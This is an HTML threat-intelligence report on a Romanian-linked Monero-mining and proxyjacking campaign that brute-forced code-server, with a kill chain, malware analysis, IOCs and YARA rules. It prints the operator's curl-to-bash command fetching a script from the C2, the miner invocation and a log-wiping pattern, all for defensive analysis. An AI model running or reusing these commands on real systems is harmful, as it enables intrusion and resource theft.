@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Monero-mining and proxyjacking campaign on Oracle Cloud aarch64</title>
+  <meta name="description" content="Reverse-engineering report on a previously-unreported Monero-mining and Traffmonetizer proxyjacking campaign targeting code-server instances on Linux aarch64.">
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg: #0e0e0e;
+      --text: #d4d4d4;
+      --muted: #888;
+      --rule: #2a2a2a;
+      --code-bg: #161616;
+    }
+
+    html { font-size: 17px; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: "Iowan Old Style", "Palatino Linotype", Palatino, Georgia, serif;
+      line-height: 1.65;
+      max-width: 40rem;
+      margin: 0 auto;
+      padding: 4rem 1.5rem 6rem;
+    }
+
+    a { color: inherit; text-decoration: underline; text-decoration-color: var(--muted); text-underline-offset: 3px; text-decoration-thickness: 1px; }
+    a:hover { text-decoration-color: var(--text); }
+
+    nav { margin-bottom: 3.5rem; font-size: 0.875rem; color: var(--muted); }
+    nav a { color: var(--muted); }
+
+    header { margin-bottom: 2.5rem; }
+
+    .meta {
+      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+      font-size: 0.72rem;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 0.75rem;
+    }
+
+    h1 { font-size: 1.5rem; font-weight: 700; line-height: 1.25; margin-bottom: 1rem; }
+
+    .lede { font-size: 1.05rem; color: var(--muted); border-left: 2px solid var(--rule); padding-left: 1rem; }
+
+    h2 {
+      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+      font-size: 0.72rem;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin: 3rem 0 1.25rem;
+    }
+
+    h3 { font-size: 1rem; font-weight: 700; margin: 2rem 0 0.75rem; }
+
+    p { margin-bottom: 1rem; }
+
+    code {
+      font-family: "JetBrains Mono", "Fira Code", "Cascadia Code", ui-monospace, monospace;
+      font-size: 0.82rem;
+      background: var(--code-bg);
+      padding: 0.1em 0.35em;
+      border-radius: 3px;
+      color: #c8c8c8;
+    }
+
+    pre {
+      background: var(--code-bg);
+      border: 1px solid var(--rule);
+      border-radius: 4px;
+      padding: 1rem 1.25rem;
+      overflow-x: auto;
+      margin: 1.25rem 0;
+    }
+
+    pre code {
+      background: none;
+      padding: 0;
+      font-size: 0.78rem;
+      line-height: 1.55;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.85rem;
+      margin: 1.25rem 0;
+      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+    }
+
+    th {
+      text-align: left;
+      font-size: 0.7rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--muted);
+      padding: 0.5rem 0.75rem;
+      border-bottom: 1px solid var(--rule);
+    }
+
+    td {
+      padding: 0.5rem 0.75rem;
+      border-bottom: 1px solid var(--rule);
+      vertical-align: top;
+      color: var(--text);
+    }
+
+    td code { font-size: 0.75rem; }
+
+    tr:last-child td { border-bottom: none; }
+
+    .hash { font-family: "JetBrains Mono", ui-monospace, monospace; font-size: 0.72rem; color: var(--muted); word-break: break-all; }
+
+    .tag {
+      display: inline-block;
+      font-family: ui-sans-serif, -apple-system, system-ui, sans-serif;
+      font-size: 0.68rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      border: 1px solid var(--rule);
+      padding: 0.15em 0.5em;
+      border-radius: 3px;
+      color: var(--muted);
+      margin-right: 0.35rem;
+    }
+
+    .callout {
+      border-left: 2px solid var(--rule);
+      padding: 0.75rem 1rem;
+      margin: 1.25rem 0;
+      font-size: 0.9rem;
+      color: var(--muted);
+    }
+
+    hr { border: none; border-top: 1px solid var(--rule); margin: 2.5rem 0; }
+
+    footer { margin-top: 4rem; font-size: 0.875rem; color: var(--muted); }
+    footer a { color: var(--muted); }
+  </style>
+</head>
+<body>
+
+<nav><a href="/">nehemiyawicks.github.io</a></nav>
+
+<header>
+  <p class="meta">7 May 2026 &nbsp;/&nbsp; Threat intelligence &nbsp;/&nbsp; First publication</p>
+  <h1>Monero-mining and proxyjacking campaign on Oracle Cloud aarch64</h1>
+  <p class="lede">A previously-unreported campaign targeting public-facing code-server instances. The operator ran XMRig and Traffmonetizer simultaneously on stolen compute, earned roughly $1,500/month, and has been active since November 2025. No prior public coverage of these IOCs exists at time of writing.</p>
+</header>
+
+<p><span class="tag">T1110.001</span><span class="tag">T1496.001</span><span class="tag">T1496.002</span><span class="tag">T1053.003</span><span class="tag">T1059.004</span></p>
+
+<h2>Background</h2>
+
+<p>On 7 May 2026 a forensic investigation of a compromised Oracle Cloud aarch64 VM (Kali Rolling, kernel 5.15.0-1081-oracle) found four malicious processes running under a code-server pty session. The host had been live for 13 days before detection. The investigation produced a full static reverse-engineering pass over seven ELF samples and six shell scripts, a scrape of the operator's open Apache C2 directory, a live Stratum probe of the mining pool, and a pool-API query that confirmed real XMR payouts. None of the IOCs appear in any public threat-intel feed at time of publication.</p>
+
+<h2>Compromise timeline</h2>
+
+<table>
+  <thead><tr><th>UTC</th><th>Event</th></tr></thead>
+  <tbody>
+    <tr><td>2025-11-19 15:32</td><td>Operator uploads first binaries to C2 (syst3md / log, x86_64 XMRig). Campaign begins.</td></tr>
+    <tr><td>2026-01-12 14:03</td><td>aarch64 XMRig (Error84) and macOS dropper added to C2.</td></tr>
+    <tr><td>2026-02-27 14:05</td><td>Traffmonetizer clients (cli, cliaarch) and multi-arch dropper (auto) uploaded.</td></tr>
+    <tr><td>2026-03-07 13:52</td><td>Full second-stage scripts, launchers, and PRoot staged.</td></tr>
+    <tr><td>2026-03-29 21:40</td><td>Earlier root-level compromise of this host: <code>/etc/systemd/system/log.service</code> backdoor installed. Binary was x86_64-only; failed on aarch64 and went unnoticed.</td></tr>
+    <tr><td>2026-04-24 23:43:53</td><td>Last failed code-server login from 91.224.92.34 (163,001st attempt).</td></tr>
+    <tr><td>2026-04-24 23:54:03</td><td>Watchdog bash loop (PID 1753687) spawns under code-server pty host. Miner and two proxyjacking clients start within ten seconds.</td></tr>
+    <tr><td>2026-04-28 11:57</td><td>Operator uploads wd1337: fresh XMRig build with rotated wallet and single-pool config.</td></tr>
+    <tr><td>2026-05-05 20:27</td><td>Operator reconnects manually from 185.241.208.217 and redeploys the auto dropper.</td></tr>
+    <tr><td>2026-05-07</td><td>Investigation and cleanup. All processes killed, cron cleared, code-server purged.</td></tr>
+  </tbody>
+</table>
+
+<h2>Entry vector</h2>
+
+<p>code-server was bound to <code>0.0.0.0:8080</code> with password-only authentication and no rate limiting. A Go-based brute-force scanner hit the <code>/login</code> endpoint continuously for 13 days.</p>
+
+<table>
+  <thead><tr><th>IP</th><th>Attempts</th><th>Notes</th></tr></thead>
+  <tbody>
+    <tr><td>91.224.92.34</td><td>163,001</td><td>Primary. AS209605 UAB Host Baltic. UA: <code>Go-http-client/1.1</code>. Flagged by Malwarebytes as brute-force/ransomware node.</td></tr>
+    <tr><td>141.98.11.174</td><td>19,663</td><td>Same ASN as primary; likely the same rented fleet.</td></tr>
+    <tr><td>220.158.232.230</td><td>3,688</td><td>Viettel Cambodia, likely compromised CPE.</td></tr>
+    <tr><td>220.158.234.48</td><td>2,167</td><td>Same.</td></tr>
+    <tr><td>216.236.38.107</td><td>2,149</td><td>Eons Data Communications, HK.</td></tr>
+    <tr><td>77.90.185.118</td><td>346</td><td></td></tr>
+    <tr><td>Others</td><td>&lt;20 each</td><td></td></tr>
+  </tbody>
+</table>
+
+<p>The <code>ubuntu</code> user had <code>NOPASSWD: ALL</code> sudo from OCI cloud-init defaults, so a shell as ubuntu was effectively root. code-server logs only failed attempts; successful login leaves no application-level record. The ten-minute gap between the last failed attempt and the first malicious PID is consistent with a slow password-spray finding a valid credential on the final attempt.</p>
+
+<h2>Kill chain</h2>
+
+<table>
+  <thead><tr><th>Stage</th><th>Technique</th><th>Behaviour</th></tr></thead>
+  <tbody>
+    <tr><td>Initial access</td><td>T1110.001</td><td>code-server /login brute force via Go scanner</td></tr>
+    <tr><td>Execution</td><td>T1059.004</td><td><code>bash -c 'cd /tmp &amp;&amp; bash &lt;(curl -s http://94.26.106.195/check1.sh)'</code></td></tr>
+    <tr><td>Privilege escalation</td><td>T1548.003</td><td>OCI NOPASSWD sudo; ubuntu = root on demand</td></tr>
+    <tr><td>Persistence</td><td>T1053.003</td><td><code>*/5 * * * *</code> cron heartbeat re-fetching check1.sh</td></tr>
+    <tr><td>Persistence</td><td>T1543.002</td><td>Older: /etc/systemd/system/log.service (2026-03-29, failed on aarch64)</td></tr>
+    <tr><td>Defense evasion</td><td>T1070.002</td><td>Wipes auth.log, wtmp, btmp, lastlog, utmp, .bash_history</td></tr>
+    <tr><td>Defense evasion</td><td>T1036.005</td><td>Binaries renamed: Error84, syst3md, log, wd1337, cliaarch, cli</td></tr>
+    <tr><td>Defense evasion</td><td>T1620</td><td>Error84 ran as a deleted file (<code>/var/tmp/Error84 (deleted)</code>)</td></tr>
+    <tr><td>Resource hijacking</td><td>T1496.001</td><td>XMRig mining to operator Stratum proxies fronting C3Pool and SupportXMR</td></tr>
+    <tr><td>Resource hijacking</td><td>T1496.002</td><td>Two Traffmonetizer instances forwarding bandwidth via TCP/769 to Hetzner aggregators</td></tr>
+  </tbody>
+</table>
+
+<p>Process tree at time of detection:</p>
+
+<pre><code>systemd
+└── code-server@ubuntu.service
+    └── code-server (node)
+        └── ptyHost
+            └── bash (attacker terminal)
+                ├── 1753687  watchdog: while true; pkill competitors; sleep 5
+                ├── 1753707  cliaarch start accept --token uUbGvGz7zAMgGt...
+                ├── 1753900  Error84 -o andrewtatemunityxcrypto.com:5555 -u error -p error
+                └── 1753919  cliaarch start accept --token jUliaNLclI34oU...</code></pre>
+
+<h2>Malware analysis</h2>
+
+<h3>Error84 -- XMRig 6.24.0, aarch64</h3>
+
+<p class="hash">SHA256: 0c4bfa96b30bf3046a70d8a0143ed419a7cd58b55091c85da619a8a22cd31e1b</p>
+
+<p>Statically linked ELF64, aarch64, 7.5 MB, stripped. No packer. The <code>XMRig 6.24.0</code> version banner appears twice in strings alongside the full algorithm table (<code>randomx</code>, <code>cryptonight-monerov*</code>, <code>argon2/*</code>, etc.) and the upstream dev-donate fallback URL. Built on Alpine 14.2.0 (GCC 14.2.0) -- upstream XMRig ships no Linux-aarch64 static binary, so this is operator-compiled.</p>
+
+<p>No embedded config. Configured purely from CLI flags at runtime:</p>
+
+<pre><code>./Error84 -o andrewtatemunityxcrypto.com:5555 -u error -p error</code></pre>
+
+<p>At capture: <code>ESTAB 10.0.0.166:53168 -&gt; 94.26.106.195:5555</code>. The pool proxy accepts any credential; the operator's wallet is substituted server-side.</p>
+
+<h3>syst3md / log -- XMRig 6.22.2, x86_64 (November 2025 build)</h3>
+
+<p class="hash">SHA256: dcf343df280816c4856ee164b9b4b14906a09b1fd4bfab604ee9370529ed61d1 (both files byte-identical)</p>
+
+<p>Dynamically linked ELF64, x86_64, 9.4 MB, stripped. Built on Ubuntu 14.04 Trusty with GCC 7.5.0 -- an EOL backport chosen for maximum glibc compatibility. The two files are the same blob written under two names so persistence survives if one is killed.</p>
+
+<p>Unlike Error84, this build has a full embedded <code>config.json</code> in <code>.rodata</code> with <code>"donate-level": 0</code> and 16 pool entries spanning OVH FR relays, the operator's own Stratum proxy, SupportXMR, C3Pool, and DNS-decoy entries (114.114.114.114, 77.88.8.8, 157.240.7.8 -- these are DNS resolvers, not mining pools; they serve as config noise).</p>
+
+<h3>wd1337 -- XMRig 6.22.2, x86_64 (April 2026 rebuild)</h3>
+
+<p class="hash">SHA256: 49dfdc259084a9ecf7795fb1464a28091cf44df3df6b2486e5fcce55959d08b7</p>
+
+<p>Same codebase and build environment as syst3md/log, rebuilt on 2026-04-28. The embedded config differs in two ways: the pool list collapses from 16 entries to a single private proxy at <code>57.129.119.218:13333</code> (see Huntress crossover below), and the wallet rotates to a vanity address with the substring <code>Rcbbb</code>. The name <code>wd1337</code> is misleading; this is another XMRig binary, not the watchdog. The actual watchdog is the bash loop under PID 1753687.</p>
+
+<h3>cliaarch / cli -- Traffmonetizer Rust client v1.3.2</h3>
+
+<p class="hash">cliaarch SHA256: 8253ac8b47e87a05c203f6ba97f81dcd7026ae207363602f8cea217b5835dbff (aarch64)<br>cli SHA256: c21fa4c1d6ed5342e49ef0561cc566a2cbe06a83f6298374fe9cb4f8027b6911 (x86_64)</p>
+
+<p>Both are the official Traffmonetizer Rust client, not modified. Identification is unambiguous: the balance API hostname <code>nameblnc.traffmonetizer.com</code>, the misspelt status field <code>BallanceResponse</code> (a high-confidence YARA anchor), the persistence file <code>cli_device_ids.json</code>, and the version concatenation <code>handshake start1.3.2</code> all match the Traffmonetizer product exactly. The Cargo workspace source paths (<code>/app/src/client.rs</code>, <code>/app/src/client/balancer.rs</code>, etc.) are upstream Traffmonetizer's own build system.</p>
+
+<p>The binary opens a TLS connection to a Traffmonetizer balancer, receives an aggregator IP assignment, and connects to that aggregator on TCP/769 (observed: Hetzner hosts 142.132.220.35 and 46.4.113.203). Each <code>do_tunnel</code> message proxies a request through the victim's residential bandwidth. The operator ran two instances simultaneously under different account tokens, violating Traffmonetizer's one-account-per-IP ToS.</p>
+
+<p>The two device tokens are 32 bytes of raw entropy after base64 decode -- no JWT structure, no name embedded. The "jUliaN" appearance in one token is base64 noise, not a name.</p>
+
+<h3>Shell scripts</h3>
+
+<p><strong>check1.sh</strong> (aarch64 second-stage): installs the cron heartbeat, kills competing miners and proxy clients via <code>pkill -f</code>, downloads and runs Error84 and cliaarch, then wipes auth.log, wtmp, btmp, lastlog, utmp, and .bash_history. Romanian-language comments with correct diacritics throughout:</p>
+
+<pre><code># Verifică și adaugă linia în crontab dacă nu există
+# Verifică dacă procesul Error84 rulează
+# Rulează comenzile dacă procesul nu este găsit</code></pre>
+
+<p><strong>auto</strong>: branches on <code>uname -m</code> between aarch64 and x86_64, fetching the appropriate check script. Uses both <code>curl | bash</code> and <code>wget; bash</code> for redundancy.</p>
+
+<p><strong>checkmacos.sh</strong>: identical structure but points to a secondary C2 at <code>149.28.129.194</code> (Vultr, now dead). The macOS payload itself was never retrieved.</p>
+
+<p><strong>traff / traffaarch</strong>: launchers that bake both Traffmonetizer tokens and run two client instances per host.</p>
+
+<h3>proot</h3>
+
+<p class="hash">SHA256: b7f2adf5a225000a164f4905aabefeebe11c4c1d5bedff5e1fe8866c48dd70d2</p>
+
+<p>Upstream PRoot v5.3.1 (git tag <code>99a8417521645c6d0b6d2b64a504bf27fea5d4da</code>), not stripped, includes DWARF. Staged to allow the operator to run x86_64 binaries on aarch64 hosts without binfmt-misc. On this victim it was never invoked because native aarch64 binaries were available.</p>
+
+<h2>Operator attribution</h2>
+
+<p>Confidence: medium. The linguistic, temporal, and infrastructure evidence is consistent with a single Romanian-speaking author operating at hobby cadence.</p>
+
+<p><strong>Language.</strong> Three dropper scripts contain diacritic-correct literary Romanian. The phrasing is natural dev-dialect: <code>Verifică și adaugă linia în crontab dacă nu există</code> is how a Romanian developer would write it for themselves, not how Google Translate renders it. The English error string <code>[!] the line not exit in crontab reload</code> has verb-phrase order typical of Romanian syntax (<em>linia nu există</em> = "the line not exist"). The <code>test.txt</code> file on the C2 contained <code>merge boss</code> -- <em>merge</em> is Romanian present indicative of <em>a merge</em> ("to run/work"), so the string reads "it works, boss" in Romanian dev register.</p>
+
+<p><strong>Infrastructure and timing.</strong> C2 modifications cluster into five short bursts over 5.5 months, all within the EET/EEST working-hours window (12:34--17:52 local time), with one Sunday-night outlier. Long gaps of three to seven weeks between bursts are inconsistent with a team and consistent with a single author working evenings and weekends.</p>
+
+<p><strong>Build-host fingerprint.</strong> The x86_64 XMRig variants link against <code>Ubuntu 7.5.0-3ubuntu1~14.04.1</code> (Ubuntu Trusty, EOL since 2024). Both the November 2025 and April 2026 builds use the same environment, indicating the operator retained the same build machine for at least six months. The aarch64 XMRig links against <code>Alpine 14.2.0</code> GCC. Any other XMRig sample linking against <code>Ubuntu 7.5.0-3ubuntu1~14.04.1</code> is likely the same operator or the same shared build farm in this cluster.</p>
+
+<p><strong>Diicot/Mexals adjacency.</strong> The combination of Romanian-language dropper scripts, custom XMRig builds with embedded configs, cron-based persistence, a watchdog that kills competing miners, and <code>/var/tmp/</code> staging closely follows the published Diicot/Mexals playbook (Bitdefender 2023, Akamai 2023, Wiz 2023). This actor differs in two respects: the initial access vector is code-server brute force (not SSH), and the monetization adds Traffmonetizer proxyjacking on top of mining (not reported in any Diicot writeup). No IOC overlap with published Diicot clusters exists. This is treated as a Diicot-adjacent actor rather than a positive Diicot ID.</p>
+
+<p><strong>Skill assessment.</strong> Competent enough to compile multi-arch XMRig, maintain separate build pipelines, and implement a turf-war watchdog. Careless about operational security in ways that leave forensic leverage: cleartext HTTP for all payload delivery, wallets embedded in plaintext in .rodata, a default Apache directory listing exposing the entire toolkit, and the standard <code>Go-http-client/1.1</code> user-agent on the brute-force scanner.</p>
+
+<p><strong>Hands-on-keyboard IP.</strong> 185.241.208.217 (AS210558, 1337 Services GmbH, brand rdp.sh) made two successful management connections to code-server on 2026-05-03 and 2026-05-05, the latter within a minute of the <code>auto</code> dropper being re-deployed. This is a no-KYC bulletproof host with a deliberately AWS-impersonating PTR record (<code>*.powered.by.amazon.com</code>).</p>
+
+<h2>Financial trail</h2>
+
+<p>A SupportXMR API query from a Tor exit on 2026-05-07 returned live payout data for two of the three wallets. XMR price at query time: $416.14.</p>
+
+<table>
+  <thead><tr><th>Wallet</th><th>XMR paid lifetime</th><th>USD equivalent</th><th>Current hashrate</th></tr></thead>
+  <tbody>
+    <tr><td>W1 (46d1re6b...9Mg)</td><td>13.898 XMR</td><td>$5,783</td><td>1.62 MH/s</td></tr>
+    <tr><td>W2 (47qQHF...rCgHe)</td><td>17.429 XMR</td><td>$7,253</td><td>112 KH/s</td></tr>
+    <tr><td>W3 (46nLNch8...7QX, vanity)</td><td>0 XMR</td><td>$0</td><td>0 (idle)</td></tr>
+    <tr><td><strong>Total (SupportXMR)</strong></td><td><strong>31.33 XMR</strong></td><td><strong>~$13,036</strong></td><td><strong>~1.74 MH/s</strong></td></tr>
+  </tbody>
+</table>
+
+<p>Wallet 1 hits SupportXMR's 0.1-XMR auto-payout threshold roughly every 24 hours. At $42/day from W1 alone and approximately $6/day from W2, the visible SupportXMR run-rate is around $1,500/month. This excludes earnings from the private pool at 57.129.119.218:13333 (wd1337 only, not queryable) and Traffmonetizer income (estimated $50--200/month from peer reports). Infra costs across five VPS rentals are $60--150/month. Net to the operator: approximately $1,400--1,600/month visible, probably higher with the private pool.</p>
+
+<p>Worker identifiers exposed by the pool API: <code>["C4", "proxy"]</code> for W1 and <code>["C4"]</code> for W2. The literal <code>C4</code> matches the <code>"pass": "C4"</code> field embedded in every XMRig config. The operator was disciplined enough not to use hostnames as worker IDs, so victim enumeration via the pool API produced nothing.</p>
+
+<p>At 1.74 MH/s aggregate, the operator's botnet is roughly 50--250 victim CPUs, depending on CPU generation.</p>
+
+<h2>Huntress crossover: the FH8a7d7M cryptominer</h2>
+
+<p>Huntress's Codex Part Two writeup names <code>57.129.119.218</code> as a "private Monero mining pool used by the FH8a7d7M cryptominer." This is the sole pool configured in wd1337, the newest binary on the C2 (built 2026-04-28). The overlap on a private pool that appears in neither public pool directories nor any other known campaign makes it highly probable that FH8a7d7M is Huntress's internal tracking label for this operator. Huntress likely has victim telemetry from endpoints running their agent; correlating their FH8a7d7M case against the IOC bundle below should be productive.</p>
+
+<h2>C2 and operator infrastructure</h2>
+
+<table>
+  <thead><tr><th>Asset</th><th>Role</th><th>Provider</th></tr></thead>
+  <tbody>
+    <tr><td>94.26.106.195</td><td>Primary C2 (Apache fileserver) + Stratum proxy :5555</td><td>AS215607 dataforest GmbH via vmheaven.io, Bulgaria</td></tr>
+    <tr><td>andrewtatemunityxcrypto.com</td><td>Mining pool DNS facade, A -&gt; 94.26.106.195</td><td>Porkbun, created 2025-11-19</td></tr>
+    <tr><td>wixerzhongboost.eu</td><td>Backup proxy domain (parked, decommissioned)</td><td>EURid / Hostinger; cert lapsed 2026-04-16</td></tr>
+    <tr><td>57.129.119.218:13333</td><td>Private pool (wd1337), FH8a7d7M per Huntress</td><td>OVH FR, AS16276</td></tr>
+    <tr><td>185.241.208.217</td><td>Operator hands-on-keyboard</td><td>AS210558 1337 Services GmbH (rdp.sh), no-KYC bulletproof</td></tr>
+    <tr><td>149.28.129.194</td><td>macOS staging (secondary C2)</td><td>Vultr, AS20473 -- dead as of investigation</td></tr>
+    <tr><td>141.94.96.71</td><td>Mining relay :3333/:443/:7777</td><td>OVH FR</td></tr>
+    <tr><td>54.38.33.16</td><td>Mining relay (stale, :5555 refused at investigation)</td><td>OVH FR</td></tr>
+    <tr><td>77.221.157.206:6196</td><td>Mining relay</td><td>AEZA Group, RU (bulletproof-adjacent)</td></tr>
+    <tr><td>121.32.254.175:3333</td><td>Mining relay (likely victim relay)</td><td>China Telecom Guangzhou</td></tr>
+  </tbody>
+</table>
+
+<p>The C2 runs an unmodified Apache 2.4.41 (Ubuntu 20.04) with default directory listing enabled. The operator has not patched or reconfigured it since deployment. A Stratum probe of 94.26.106.195:5555 confirmed the pool was live and accepting any credential at time of investigation, returning real RandomX work at Monero chain height 3668817. The proxy uses 15-digit decimal session IDs, returns a fixed 436-byte template, and is silent on unknown methods -- consistent with custom Go or Rust proxy code rather than stock xmrig-proxy.</p>
+
+<h2>IOCs</h2>
+
+<h3>Binary hashes</h3>
+
+<table>
+  <thead><tr><th>Sample</th><th>SHA256</th><th>Type</th></tr></thead>
+  <tbody>
+    <tr><td>Error84</td><td class="hash">0c4bfa96b30bf3046a70d8a0143ed419a7cd58b55091c85da619a8a22cd31e1b</td><td>aarch64 ELF, XMRig 6.24.0</td></tr>
+    <tr><td>cliaarch</td><td class="hash">8253ac8b47e87a05c203f6ba97f81dcd7026ae207363602f8cea217b5835dbff</td><td>aarch64 ELF, Traffmonetizer 1.3.2</td></tr>
+    <tr><td>cli</td><td class="hash">c21fa4c1d6ed5342e49ef0561cc566a2cbe06a83f6298374fe9cb4f8027b6911</td><td>x86_64 ELF, Traffmonetizer 1.3.2</td></tr>
+    <tr><td>syst3md / log</td><td class="hash">dcf343df280816c4856ee164b9b4b14906a09b1fd4bfab604ee9370529ed61d1</td><td>x86_64 ELF, XMRig 6.22.2 (Nov 2025)</td></tr>
+    <tr><td>wd1337</td><td class="hash">49dfdc259084a9ecf7795fb1464a28091cf44df3df6b2486e5fcce55959d08b7</td><td>x86_64 ELF, XMRig 6.22.2 (Apr 2026)</td></tr>
+    <tr><td>proot</td><td class="hash">b7f2adf5a225000a164f4905aabefeebe11c4c1d5bedff5e1fe8866c48dd70d2</td><td>x86_64 ELF, PRoot 5.3.1 (unmodified upstream)</td></tr>
+    <tr><td>checkmacos.sh</td><td class="hash">0ffa6dafa8c65e522224da55752e0b4b8b5fb386719a866247e40e788f5fa0d1</td><td>bash, macOS second-stage</td></tr>
+    <tr><td>oldercheck.sh</td><td class="hash">049f300e4ff0f302f770fade35b547dd8ec8ad1e1ef44f2bb879dae917cd2dfb</td><td>bash, predecessor dropper</td></tr>
+    <tr><td>traff</td><td class="hash">2e2db20a9ecc40cfe9ada520d9ab1e9c6eafed409b8963d9d81eed84125cbfe6</td><td>bash, Traffmonetizer launcher x86_64</td></tr>
+    <tr><td>traffaarch</td><td class="hash">caec5092e13bba9bd69d10e952bd16e0e96646b701042e7e6eae9eb0dddc91cc</td><td>bash, Traffmonetizer launcher aarch64</td></tr>
+  </tbody>
+</table>
+
+<h3>Network</h3>
+
+<table>
+  <thead><tr><th>Indicator</th><th>Type</th><th>Role</th></tr></thead>
+  <tbody>
+    <tr><td>94.26.106.195</td><td>IP</td><td>Primary C2 + Stratum proxy</td></tr>
+    <tr><td>185.241.208.217</td><td>IP</td><td>Operator hands-on-keyboard (highest priority)</td></tr>
+    <tr><td>149.28.129.194</td><td>IP</td><td>macOS staging C2 (dead)</td></tr>
+    <tr><td>57.129.119.218</td><td>IP</td><td>Private mining pool :13333 (wd1337, FH8a7d7M per Huntress)</td></tr>
+    <tr><td>141.94.96.71</td><td>IP</td><td>Mining relay :3333/:443/:7777 (OVH FR)</td></tr>
+    <tr><td>54.38.33.16</td><td>IP</td><td>Mining relay (stale)</td></tr>
+    <tr><td>77.221.157.206</td><td>IP</td><td>Mining relay :6196 (AEZA RU)</td></tr>
+    <tr><td>121.32.254.175</td><td>IP</td><td>Mining relay :3333</td></tr>
+    <tr><td>91.224.92.34</td><td>IP</td><td>Primary brute-forcer</td></tr>
+    <tr><td>141.98.11.174</td><td>IP</td><td>Secondary brute-forcer (same ASN)</td></tr>
+    <tr><td>andrewtatemunityxcrypto.com</td><td>Domain</td><td>Operator pool DNS, A -&gt; C2</td></tr>
+    <tr><td>wixerzhongboost.eu</td><td>Domain</td><td>Backup proxy (parked)</td></tr>
+    <tr><td>142.132.220.35:769</td><td>IP:port</td><td>Traffmonetizer aggregator (Hetzner)</td></tr>
+    <tr><td>46.4.113.203:769</td><td>IP:port</td><td>Traffmonetizer aggregator (Hetzner)</td></tr>
+  </tbody>
+</table>
+
+<h3>Monero wallets</h3>
+
+<pre><code>46d1re6b3qvSAeTgn9AvVk1D1JJCLEjnUDnzTPXewT8cPgbPfAU2DifdqiQQWMMTSV8qPiVx9jLY9MWxv9Qw8FmCK2xH9Mg
+  -- W1, primary (syst3md/log embedded config, SupportXMR confirmed)
+
+47qQHFXfGixiVEjwPNaVpQ8LJ6p8xNPHLjWKZC86us4WfhxacyXivPAGoThcgbwUaiAi4CjveFdsMLEYEUMhhrLA4nrCgHe
+  -- W2, operator proxy rebadge (andrewtatemunityxcrypto.com:5555 only)
+
+46nLNch8se4Z15e4UCEfu9NnHtTVXqFDbaWssR8j9jBSbhPtRcbbb678serCXkRWnxHPHpUXtkthUT5RXa6WLHv9Qs4i7QX
+  -- W3, vanity-mined rotation (wd1337, Apr 2026)</code></pre>
+
+<h3>Traffmonetizer device tokens</h3>
+
+<pre><code>uUbGvGz7zAMgGtHsTo8EOi1krvj+OPi7SF5UMeoCJnU=
+jUliaNLclI34oUpjC7ewra/HjEuw+UgYa7jrpxMBC3k=</code></pre>
+
+<p>These are per-account 32-byte opaque secrets. Reporting them to Traffmonetizer (Bytemarket OU, Tallinn) with forensic evidence of installation on non-consenting devices should trigger account freezes and disrupt the proxyjacking income stream.</p>
+
+<h3>Filesystem indicators</h3>
+
+<pre><code>/var/tmp/Error84, /var/tmp/cliaarch, /var/tmp/cli
+/var/tmp/syst3md, /var/tmp/log, /var/tmp/wd1337, /var/tmp/auto
+/etc/systemd/system/log.service  (ExecStart=/usr/bin/log -sshd)
+/tmp/report_system.lock
+crontab line containing: 94.26.106.195</code></pre>
+
+<h2>Detection rules</h2>
+
+<h3>YARA</h3>
+
+<pre><code>rule apt_xmrig_renamed_aarch64_Error84
+{
+    meta:
+        description = "XMRig 6.24.0 aarch64, statically linked, renamed"
+        sha256      = "0c4bfa96b30bf3046a70d8a0143ed419a7cd58b55091c85da619a8a22cd31e1b"
+        mitre       = "T1496.001"
+    strings:
+        $banner         = "XMRig 6.24.0" ascii
+        $algo_t1        = "cryptonight-monerov7" ascii
+        $algo_t2        = "randomx" ascii
+        $stratum_donate = "stratum+ssl://randomx.xmrig.com:443" ascii
+    condition:
+        uint32(0) == 0x464C457F and $banner
+        and 2 of ($algo_t1, $algo_t2, $stratum_donate)
+}
+
+rule apt_xmrig_renamed_x86_64_syst3md_wd1337
+{
+    meta:
+        description = "XMRig 6.22.2 x86_64 with embedded operator config"
+        mitre       = "T1496.001"
+    strings:
+        $banner      = "XMRig 6.22.2" ascii
+        $donate0     = "\"donate-level\": 0," ascii
+        $pass_C4     = "\"pass\": \"C4\"," ascii
+        $wallet1     = "46d1re6b3qvSAeTgn9AvVk1D1JJCLEjnUDnzTPXewT8c" ascii
+        $wallet3     = "46nLNch8se4Z15e4UCEfu9NnHtTVXqFDbaWssR8j9jBSb" ascii
+        $pool_op     = "andrewtatemunityxcrypto.com:5555" ascii
+        $pool_new    = "57.129.119.218:13333" ascii
+    condition:
+        uint32(0) == 0x464C457F and $banner
+        and (any of ($wallet1, $wallet3) or any of ($pool_op, $pool_new))
+}
+
+rule traffmonetizer_rust_client_proxyjacking
+{
+    meta:
+        description = "Traffmonetizer Rust client v1.3.2 (gate on context)"
+        mitre       = "T1496.002"
+    strings:
+        $bal_typo  = "BallanceResponse" ascii   // misspelt -- high signal
+        $api_host  = "nameblnc.traffmonetizer.com" ascii
+        $persist   = "cli_device_ids.json" ascii
+        $rust_src1 = "/app/src/client.rs" ascii
+        $rust_src2 = "/app/src/messaging.rs" ascii
+        $ver       = "handshake start1.3.2" ascii
+    condition:
+        uint32(0) == 0x464C457F and $api_host
+        and 2 of ($bal_typo, $persist, $rust_src1, $rust_src2)
+}
+
+rule dropper_romanian_andrewtatemunity
+{
+    meta:
+        description = "Romanian-language dropper with C2 reference and log wipe"
+        mitre       = "T1059.004,T1070.002,T1053.003"
+    strings:
+        $ro1        = "Verifică și adaugă linia în crontab" ascii wide
+        $ro2        = "Verifică dacă procesul" ascii wide
+        $ro3        = "Rulează comenzile dacă procesul nu este găsit" ascii wide
+        $c2         = "94.26.106.195" ascii
+        $wipe       = "rm -rf auth.log" ascii
+        $cron       = "*/5 * * * * /usr/bin/bash" ascii
+    condition:
+        any of ($ro*) and ($c2 or $wipe or $cron)
+}
+
